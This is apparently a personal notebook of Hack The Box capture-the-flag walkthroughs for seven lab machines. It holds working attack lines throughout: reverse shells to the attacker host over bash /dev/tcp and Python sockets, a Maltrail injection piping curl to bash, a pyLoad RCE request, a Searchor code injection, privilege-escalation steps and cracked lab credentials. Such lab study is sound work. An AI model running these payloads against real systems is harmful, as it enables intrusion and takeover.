# HTB_Machines_Easy

## MonitorsTwo
1. Observe opened ports
    - `sudo nmap <ip>`
        - 22/tcp open ssh
        - 80/tcp open http
2. Observe website (http is open)
    - URL = 10.10.11.211
        -  login screen
        -  Cacti version 1.2.22
            -  search for the vulns
                -  CVE-2022-46169 (https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22)
3. Exploit the CVE-2022-46169 vuln
    - download the exploit script
        - `git clone https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22`
    - `nc -nlvp 443`
    - `python3 CVE-2022-46169.py  -u http://<ip> --LHOST=<local_IP> --LPORT=443`
        - LHOST can be obtained with `ifconfig` -> tun0 IP
    - explore the reverse shelled connection
        - `whoami` `ls -l /`
        - `ls -la /`
            - we can see the file ".dockerenv" -> we are inside Docker container
        - `cat entrypoint.sh`
            >mysql --host=db --user=root --password=root cacti -e "show tables"

        - `mysql --host=db --user=root --password=root cacti -e "show tables"`


## Busqueda
1. Reco
`sudo nmap -sVC 10.10.11.208`
    - sudo nano /etc/hosts
        - 10.10.11.208  searcher.htb
2. Weaponisation
App is running Searchor v2.4.0 which has vuln
![](https://hackmd.io/_uploads/S1qlltUqh.png)

3. Exploitation
- as a search value, insert RS inside it:
    - `nc -nlvp 4444`
    - `'),__import__('os').system('bash -c "bash -i >& /dev/tcp/<IP>/<port> 0>&1"')#`

4. User flag
    - cd
    - cat user.txt

5. Root flag
    
    ![](https://hackmd.io/_uploads/HkC_MK8qn.png)
    - UN: cody
    - PW: jh1usoih2bkjaspwe92 
- SSH connect
    - ssh svc@10.10.11.208
        - PW: jh1usoih2bkjaspwe92
    - we can edit the python script file
        - ![](https://hackmd.io/_uploads/SyKJVFIqn.png)
- PE
    - [exploit](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-privilege-escalation/)
        - `import socket,os,pty;s=socket.socket();s.connect(("<local-ip>",<port>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")`
    - cd
        - `nano full-checkup.sh`
            - ![](https://hackmd.io/_uploads/HyyBHKLq3.png)

```
#!/usr/bin/python3
import socket,os,pty;s=socket.socket();s.connect(("10.10.14.12",1234));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")
```
- `chmod +x full-checkup.sh`
    - LOCAL machine: `nc -nlvp <port>`
    - `sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup`

![](https://hackmd.io/_uploads/S13UdFU9h.png)

## MonitorsTwo
1. Reco
    - `sudo nmap -sVC 10.10.11.211 -Pn`
    - website on 10.10.11.211
2. Weaponisation
- running Cacti v1.2.22
            - [VULN](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22)
                - exploit allows through an RCE to obtain RS
3. Exploitation
- `nc -nlvp <port>`
- `python3 CVE-2022-46169.py -u http://<MACHINE_IP> --LHOST=<LOCAL_IP> --LPORT=<PORT>`
- we are inside www-data
    - cd 
    - ls -la 
        - there is an "entrypoint.sh" file
            - cat entrypoint.sh
                ![](https://hackmd.io/_uploads/H1H3v98qh.png)
                - MySQL credentials
    - cd /var/www/html
        - cat cacti.sql
            - login credentials
                ![](https://hackmd.io/_uploads/ryqNccI92.png)

                - admin, guest
                    - but not much helpful
    - there is "linpeas.sh" file
        - after run it shows that /sbin/capsh is vuln
            - [VULN](https://gtfobins.github.io/gtfobins/capsh/#suid)
                - go to the /sbin folder
                    - `./capsh --gid=0 --uid=0 --`
                    - `mysql — host-db — user=root cacti -e “SELECT * FROM user_auth”`
                        - user marcus with hash PW
                            - crack PW with john or hashcat
                            - `hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt  --sho`
                                - marcus:funkymonkey
4. User flag
    - ssh marcus@10.10.11.211
        - PW: funkymonkey
    ![](https://hackmd.io/_uploads/rylmhqIc3.png)
5. Root flag
    - cat /var/mail/marcus
        - ![](https://hackmd.io/_uploads/SJ6faqIq2.png)
    - Docker version
        - ![](https://hackmd.io/_uploads/BJbh2qU92.png)
        - [VULN](https://github.com/UncleJ4ck/CVE-2021-41091)
    - upload the CVE exploit to the marcus ssh
    - LOCAL machine:    
        - git clone https://github.com/UncleJ4ck/CVE-2021-41091
        - cd CVE-2021-41091
        - chmod +x ./exp.sh
        - python3 -m http.server 80
    - marcus:
        - wget http://<LOCAL_IP>/exp.sh
    ![](https://hackmd.io/_uploads/BJxElo8q3.png)
        - chmod +x exp.sh
        - ./exp.sh
            - yes
        - cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
        - ./bin/bash -p
            - NOTHING HAPPENS even after restarting machine
                - cant obtain root flag...

## PC
1. Reco
- `nmap -sVC 10.10.11.214 -Pn -p-`
    - 22 SSH
    - 50051 gRPC channel
        - [TOOL](https://github.com/fullstorydev/grpcui)
2. Weaponisation
    - grpcui -plaintext 10.10.11.214:50051
    - ![](https://hackmd.io/_uploads/HyzIFj8c3.png)
        - admin:admin
            - obtained token
3. Exploitation
        - run it in burpsuite
            - save the request as "sqli.req"
                - sqlmap -r sqli.req --dump
                ![](https://hackmd.io/_uploads/SJH3ti853.png)
                - admin:admin
                - sau:HereIsYourPassWord1431
4. User flag
    - ssh sau@10.10.11.214
        - PW: HereIsYourPassWord1431
    - ls
    - cat user.txt

5. Root flag
    - PE
        - nothing useful using linpeas.sh
            - cd 
                - netstat -nltp
            - BUT running port 8000, service pyLoad
                - [VULN](https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad)
        - `ssh -L 8888:127.0.0.1:8000 sau@10.10.11.214`
            - access URL: 127.0.0.1:8888
                - ![](https://hackmd.io/_uploads/Hkva3iI9n.png)
        - pyload --version
            - pyLoad 0.5.0
                - [CVE](https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/)
>                     - curl -i -s -k -X $'POST' \
>     -H $'Host: 127.0.0.1:8000' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 184' \
>     --data-binary $'package=xxx&crypted=AAAA&jk=%70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22%74%6f%75%63%68%20%2f%74%6d%70%2f%70%77%6e%64%22%29;f=function%20f2(){};&passwords=aaaa' \
>     $'http://127.0.0.1:8000/flash/addcrypted2'
- [Exploit Code](https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad)
    - edit it for our purpose
curl -i -s -k -X $'POST' \
    --data-binary $'jk=pyimport%20os;os.system(\"Bash%20/dev/shm/rev.sh\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
    $'http://127.0.0.1:8000/flash/addcrypted2'
- on SAU:
    - cd /dev
        - cd shm
            - nano rev.sh
                - ![](https://hackmd.io/_uploads/SkYEyhUc2.png)
            - chmod +x rev.sh
            - ./rev.sh
            - ![](https://hackmd.io/_uploads/rylOE2Iq3.png)

- on LOCAL machine:
    - `nc -nlvp 4444`
    - boom, we are in
        - cd 
        - cat root.txt

## Topology
1. Reco
    - `nmap -sVC 10.10.11.217 -Pn -p-`
        - 22 and 80 open
    - website
        - Gobuster found nothing
        - there is a link to LaTex Equation Generator
2. Weaponisation
            - HTPASSWD exploit
                - `$\lstinputlisting{/var/www/dev/.htpasswd}$`
                - ![](https://hackmd.io/_uploads/rkeYInIq3.png)
3. Exploitation
    - we obtained login credentials with hashed PW
        - hash-identifier -> md5
            - decrypt it to obtain PW
                - vdaisley@topology.htb:calculus20 
4. User flag
    - ssh vdaisley@10.10.11.217
        - PW: calculus20
    - ls
    - cat user.txt

5. Root flag
    - while searching the dirs in user, there is gnuplot in /opt dir
        - ![](https://hackmd.io/_uploads/rkJWO2Ucn.png)
        - gnuplot uses plt files - we can use it for pspy86 exploitation
            - lets create http server, upload a file containing exploit inside the machine to obtain root privileges
    - LOCAL machine:
        - download pspy64 exploit
        - python -m http.server
    - TARGET machine:
        - wget <LOCAL_IP>:8000/pspy64
        - echo "system "chmod u+s"" > /opt/gnuplot/test.plt
        - cat /opt/gnuplot/test.plt
        - ls -la /opt/gnuplot/test.plt
        - bash -p
        - whoami
        - cd root
            - cat root.txt

## Keeper
### Reco
- nmap
    ![](https://hackmd.io/_uploads/SygLzvjn2.png)
    - 22 SSH
    - 80 HTTP without a redirect 
- website
    - ![](https://hackmd.io/_uploads/H1-lXPihh.png)
        - this tells us to add the URl into redirects to be able to connect to the website
            - /etc/hosts -> `tickets.keeper.htb`
                - ![](https://hackmd.io/_uploads/SJCHNvsn2.png)
    - website login accessed:
        ![](https://hackmd.io/_uploads/S19u4vs3n.png)

### Weaponisation
- website is running this one:
    - Best Practical Request Tracker (RT) 4.4.4
        - outdated, little bit of finding to obtain default login credentials:
            - `root:password`
                - [Source](https://wiki.gentoo.org/wiki/Request_Tracker)
            ![](https://hackmd.io/_uploads/H1w8Hws3n.png)
- after login
    - there is one ticket with history
        ![](https://hackmd.io/_uploads/HJY1UDj33.png)
        - The attachment has been removed...
        - But there's also mention of another user named `lnorgaard`
### Exploitation
- When we use the `Admin panel to view all Users`, there's a password located within the user's comments
    - access admin -> users
        ![](https://hackmd.io/_uploads/SyrpDvon3.png)
    - select the user
        ![](https://hackmd.io/_uploads/B1ckOwjhh.png)
    - obtain SSH login credentials
        ![](https://hackmd.io/_uploads/rkRSYPjh3.png)
### User flag
- SSH login w found login creds
    - lnorgaard@10.10.11.227
        - PW: `Welcome2023!`
- ls
- cat user.txt

### Root flag
- ls
- unzip RT30000.zip
    ![](https://hackmd.io/_uploads/SyHncvj23.png)
    - passcodes.kdbx
    - KeePassDumpFull.dmp
        - there is a CVE for KeePassDump from 2023 - obtaining PW from Linux memory dump
            - [Exploit to obtain PW from dmp](https://sysdig.com/blog/keepass-cve-2023-32784-detection/)
            - [PoC](https://github.com/vdohney/keepass-password-dumper)
            - [keepdump-master-key](https://github.com/CMEPW/keepass-dump-masterkey)
            - [keepass-password-dumper](https://github.com/vdohney/keepass-password-dumper)
- copy files from SSH to your local
    - sudo scp lnorgaard@10.10.11.227:KeePassDumpFull.dmp <local_path>
    - sudo scp lnorgaard@10.10.11.227:passcodes.kdbx <local_path>
- clone [keepdump-master-key](https://github.com/CMEPW/keepass-dump-masterkey) and run it
    - sudo python3 poc.py -d ~/HTB/SeasonII/Keeper/KeePassDumpFull.dmp
        - Possible password: ...
            ![](https://hackmd.io/_uploads/ByDUHS7an.png)
            - little bit or googling
                - `rødgrød med fløde` (dannish dessert)
                    - open the keepass and insert this as a master pw
                        ![](https://hackmd.io/_uploads/SkApLHmTn.png)
- obtaining root access
    ![](https://hackmd.io/_uploads/SJjTcHXT3.png)
    - in Keepass, there is User named "root", PW is `F4><3K0nd!`
        - but the root PW doesnt work...
        - it is a putty user key file with fake PW...we can convert it back to an ssh key
            - lets use `puttygen` to convert ppk file into a pem file
            - copy notes to a file -> `keeper.txt`
                - `puttygen keeper.txt -0 private-openssh -0 id_rsa`
                    - note: you have to have version newer than 0.75
    - access ssh
        - ssh -i htb.pem root@keeper.htb

rødgrød med fløde 

## Sau
Foothold: This basket is powered by “you can google it”. Look up for any flaws this software had in the past and test it from your side.

User: After you find the flaw, see what other places you can reach. Repeat the googling and get initial access.

Root: Your tipical PE, pretty straight forward.Foothold: This basket is powered by “you can google it”. Look up for any flaws this software had in the past and test it from your side.
### Reco
- nmap -sVC <ip> --min-rate=500
    - 22 SSH
    - 80 HTTP (filtered)
    - 55555 Unknown
- explore Website (http://10.10.11.224:55555)
    - storing Baskets
    - footer: ![](https://hackmd.io/_uploads/Syj9YVFK3.png)
    - This web service allows for flexible collection of HTTP requests and examination through a RESTful API or a simple web user interface.

### Weaponisation
- request-basket v1.2.1 is vuln to SSRF
    - [CVE-2023-27163](https://feedly.com/cve/CVE-2023-27163)
        - via component `/api/baskets/{name}` or `/baskets/{name}`
            - we can craft API request to access network resources

### Exploitation
- [exploit for the CVE](https://notes.sjtu.edu.cn/s/MUUhEymt7)
1. vector: payload for BURP:
```
{
    "forward_url": "http://127.0.0.1:80",
    "proxy_response": false,
    "insecure_tls": false,
    "expand_path": true,
    "capacity": 250
}
```
![](https://hackmd.io/_uploads/Bk3vS1ntn.png)

- we obtained the token 
    ![](https://hackmd.io/_uploads/BJGcrynK2.png)
- By exploiting the SSRF vulnerability, we will be able to create a specific route that we can access. Once inside this route, we can proceed to exploit the SSRF vulnerability.
2. SSRF vulnerability:
    - [maltrail](https://github.com/stamparm/maltrail)
        - When accessing the route generated through the exploitation of the SSRF vulnerability, we encountered the Maltrail application. Maltrail is a malicious traffic detection system that utilizes public lists of suspicious and malicious traces, along with static traces obtained from reports of multiple antivirus providers. 
            - It is worth noting that this version of Maltrail is outdated (v0.53)
                - [CVE detail #1](https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/)
                - [CVE detail #2](https://github.com/stamparm/maltrail/blob/master/core/httpd.py#L399)
        - During the analysis, an unauthenticated command execution vulnerability has been identified in the `subprocess.check_output` function located in the file `mailtrail/core/http.py` of Maltrail. The presence of a command injection in the `params.get("username")` parameter is the cause of this vulnerability.
    
        ![](https://hackmd.io/_uploads/SJSFD1nK3.png)
        - By exploiting the SSRF vulnerability and sending the required parameters in a POST request to the login route, we will be able to execute commands on the system and eventually escalate privileges.
    
            ![](https://hackmd.io/_uploads/B1B4Hm3K3.png)
            - username=;`curl 10.10.14.17:1234 | bash`'
            - Reverse shell connection established
                

                    
    

### User flag
    
### Root flag

## Pilgrimage
### Reco
1. sudo nmap <IP>
    - 22/tcp open  ssh
    - 80/tcp open  http
2. website
    - sudo nano /etc/hosts
        - <ip> pilgrimage.htb
    - URL: pilgrimage.htb
        - header: login/register forms
        - body: bar for uploading file
        - footer: theme
    - Git dumper
        - `git-dumper http://pilgrimage.htb/.git/ git`
        - ![](https://hackmd.io/_uploads/HJnI3Lu_n.png)
### Weaponisation
    - website handles images after uploading and shrinks its size on the website
        - separately for each user
        - PNG upload vuln
            - https://github.com/voidz0r/CVE-2022-44268
            - Run the project
                `cargo run "/etc/passwd"`

            - Use the file with ImageMagick
                `convert image.png -resize 50% output.png`


            - Analyze the resized image
                `identify -verbose output.png`

            - Convert hex to str
                `python3 -c 'print(bytes.fromhex("23202f6574632f686f7374730a3132372e302e302e31096c6f63616c686f73740a0a232054686520666f6c6c6f77696e67206c696e65732061726520646573697261626c6520666f7220495076362063617061626c6520686f7374730a3a3a3109096c6f63616c686f7374206970362d6c6f63616c686f7374206970362d6c6f6f706261636b0a666630323a3a3109096970362d616c6c6e6f6465730a666630323a3a3209096970362d616c6c726f75746572730a6475636e740a"))`
### Exploitation
3. Obtaining User access
    - `726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680d0a6461656d6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f6e6f6c6f67696e0d0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0d0a7379733a783a333a333a7379733a2f6465763a2f7573722f7362696e2f6e6f6c6f67696e0d0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f62696e2f73796e630d0a67616d65733a783a353a36303a67616d65733a2f7573722f67616d65733a2f7573722f7362696e2f6e6f6c6f67696e0d0a6d616e3a783a363a31323a6d616e3a2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0d0a6c703a783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f6c6f67696e0d0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f7573722f7362696e2f6e6f6c6f67696e0d0a6e6577733a783a393a393a6e6577733a2f7661722f73706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0d0a757563703a783a31303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f6e6f6c6f67696e0d0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0d0a7777772d646174613a783a33333a33333a7777772d646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0d0a6261636b75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f7362696e2f6e6f6c6f67696e0d0a6c6973743a783a33383a33383a4d61696c696e67204c697374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67696e0d0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f7362696e2f6e6f6c6f67696e0d0a676e6174733a783a34313a34313a476e617473204275672d5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e6174733a2f7573722f7362696e2f6e6f6c6f67696e0d0a6e6f626f64793a783a36353533343a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0d0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0d0a73797374656d642d6e6574776f726b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d656e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0d0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d64205265736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0d0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0d0a73797374656d642d74696d6573796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e697a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0d0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d652f656d696c793a2f62696e2f626173680d0a73797374656d642d636f726564756d703a783a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f7362696e2f6e6f6c6f67696e0d0a737368643a783a3130353a36353533343a3a2f72756e2f737368643a2f7573722f7362696e2f6e6f6c6f67696e0d0a5f6c617572656c3a783a3939383a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c7365`
    - from hex:
        - `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false`
>         USER EMILY => emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
    
    - dashboard.php file analysis
        - we find SQL queries to a SQLite database located at /var/db/pilgrimage
            - ![](https://hackmd.io/_uploads/Hk_phLOOh.png)
        - We will attempt to download it using a local file inclusion (LFI) vulnerability...
            - `cargo run "/var/db/pilgrimage"`
    - we found correct login credentials for SSH login
| Username | Password | 
| -------- | -------- | 
| emily    | abigchonkyboi123|
### User flag
- login through SSH to obtain user flag 
    - ls
    - cat user.txt
### Root flag
4. Priviledge Escalation - Theory
    - machine has a script running in bg and uses binwalk 2.3.2, which has vuln
        - we have to rename the exploit to .png to pass through shrunk folder with malwarescan.sh
    - ls
        - "linpeas.sh" and "pspy64"
        - nano linpeas.sh
            > ADVISORY="This script should be used for authorized penetration testing and/or educational purposes only...
    - Part of the code:
                >   if ([ -f /usr/bin/id ] && [ "$(/usr/bin/id -u)" -eq "0" ]) || [ "`whoami 2>/dev/null`" = "root" ]; then
                >   IAMROOT="1"
                >   MAXPATH_FIND_W="3"
                > else
                >   IAMROOT=""
                >   MAXPATH_FIND_W="7"
                > fi
    - ps aux
        ![](https://hackmd.io/_uploads/rySTyPddh.png)
        - we have read permissions to the file
    - cd /usr/sbin && nano malwarescan.sh
        ![](https://hackmd.io/_uploads/B1qSlD_u3.png)
        - The bash script monitors the directory /var/www/pilgrimage.htb/shrunk/ for newly created files and analyzes them for unwanted content using binwalk. If it finds unwanted content in a file, it automatically removes it...
            - The version of Binwalk found is 2.3.2, which has a vulnerability that allows arbitrary code execution. We will leverage this vulnerability to escalate our access privileges.
                - https://www.exploit-db.com/exploits/51249
                - https://onekey.com/blog/security-advisory-remote-command-execution-in-binwalk/ 
    - cd /var/www/pilgrimage.htb/shrunk
        - strings exploit.png
            - ![](https://hackmd.io/_uploads/HJTQeHhu2.png)
            - to obtain IP address
                - 10.10.14.127 4444
    - cd /dev/shm
        - rm -rf linpeas.sh
        - nano exploit.py (content of [exploit](https://www.exploit-db.com/exploits/51249))

5. PE - steps
    - LOCAL MACHINE
        - nano exploit.py (content of [exploit](https://www.exploit-db.com/exploits/51249))
        - python3 exploit.py <some_image.png> <your_tun_IP> <NC port>
            - FE: python3 exploit.py image.png 10.10.10.5 6969
        - binwalk_exploit.png has been generated
    - upload to the emily machine
        - 1. on LOCAL -> nc -nvlp 6969
        - 2. on LOCAL -> python3 -m http.server 9001
        - 3. on EMILY -> wget http://10.10.14.26:9001/binwalk_exploit.png
    - on EMILY
        - ls
            - binwalk_image.png should be there
        - ps -aux
            - malwarescan.sh running
        - cat /usr/sbin/malwarescan.sh
            - path: /var/www/pilgrimage.htb/shrunk
        - cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk
            - NC connection should be obtained
    - on NC
        - id
        - cd
        - ls -la
        - cat root.txt
